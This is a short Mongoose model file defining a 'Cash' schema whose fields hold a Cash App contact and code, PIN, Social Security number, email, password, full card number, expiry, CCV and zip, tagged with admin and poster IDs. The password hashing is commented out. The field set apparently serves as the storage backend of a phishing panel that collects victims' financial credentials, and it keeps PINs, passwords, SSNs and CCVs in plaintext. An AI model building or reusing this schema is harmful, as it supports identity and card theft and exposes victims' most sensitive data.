import mongoose from 'mongoose'

const Schema = mongoose.Schema;
const cashAppSchema = new Schema({
    contact: {
        type: String,
        trim: true

    },

    code: {
        type: String,
        trim: true

    },
    pin: { type: String, },
    ssn: { type: String },
    email: { type: String },
    password: { type: String },
    site: { type: String },
    card_number: { type: Number },
    mm_yy: { type: String },
    ccv: { type: Number },
    zip: { type: String },
    adminId: { type: String },
    posterId: { type: String }





}, { timestamps: true })

// userSchema.pre('deleteOne', function (next) {
//     const personId = this.getQuery()["_id"];
//     mongoose.model("Poster").deleteMany({ 'root': personId }, function (err, result) {
//         if (err) {
//             console.log(`[error] ${err}`);
//             next(err);
//         } else {
//             console.log('success');
//             next();
//         }
//     });
// });

// posterSchema.path('links').validate(function (value) {

//     const tofindDuplicates = value => value.filter((item, index) => value.indexOf(item) !== index)
//     const duplicateElementa = tofindDuplicates(value);
//     if (duplicateElementa.length > 0) {
//         throw new Error("Can not create Duplicate link");
//     }
// })
// userSchema.pre('save', async function(next){
//   const salt=await bcrypt.genSalt();
//   this.password=await bcrypt.hash(this.password,salt);
//   next();
// })

// userSchema.statics.login= async function(email,password){
//        const user=  await this.findOne({email});

//         if(user){
//             const auth=  await bcrypt.compare(password, user.password);
//              if(auth){
//                 return user;

//                 } 
//               throw Error('incorrect password')




//            }
//             throw Error('incorrect email')

// }

const Cash = mongoose.model('Cash', cashAppSchema);

export default Cash

